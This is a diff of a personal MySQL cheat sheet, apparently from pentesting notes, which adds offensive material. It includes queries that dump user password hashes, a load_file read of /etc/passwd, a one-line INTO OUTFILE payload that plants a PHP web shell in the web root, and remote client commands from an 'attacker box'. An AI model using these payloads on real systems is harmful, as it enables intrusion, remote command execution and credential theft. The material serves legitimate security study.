@@ -1,4 +1,4 @@
-# mysql
+# MySQL
 
 **Author:** Julien Bongars\
 **Date:** 2026-01-30 18:28:06
@@ -79,15 +79,43 @@ mysql --user user --password < path/to/backup.sql
 
 ## Show all Tables
 
-```bash
-SHOW DATABASE;
-
+```sql
+SHOW DATABASES;
 SHOW TABLES;
-
 DESCRIBE TABLES; -- this is also really useful
+SELECT version();
+SELECT user();
+SELECT current_user();
+```
+
+Inside a DB:
+
+```sql
+SELECT schema_name FROM information_schema.schemata;
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'DB';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+SELECT user, host, authentication_string FROM mysql.user;
+SHOW GRANTS;
+```
+
+FILE / RCE (needs `FILE` / `SUPER`): [SQL reverse shells](../../infiltration/reverse-shell/sql.md)
+
+```sql
+SELECT load_file('/etc/passwd');
+SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+Client from the attacker box:
+
+```bash
+mysql -h TARGET -u USER -p
+mysql -h TARGET -u USER -p -e 'SHOW DATABASES; SELECT user();'
 ```
 
 ## Resources
 
 - [MySQL](https://www.mysql.com/) — official homepage (cited in the cheat.sh dump)
 - [cheat.sh mysql](https://cheat.sh/mysql) — extra flag examples
+- [SQL reverse shells](../../infiltration/reverse-shell/sql.md) — INTO OUTFILE / sys_exec
+- [sqlmap](./sqlmap.md) — when you have a injectable HTTP param instead of a client
+- [Manual SQLi](./manual.md) — quote / ORDER BY / delay
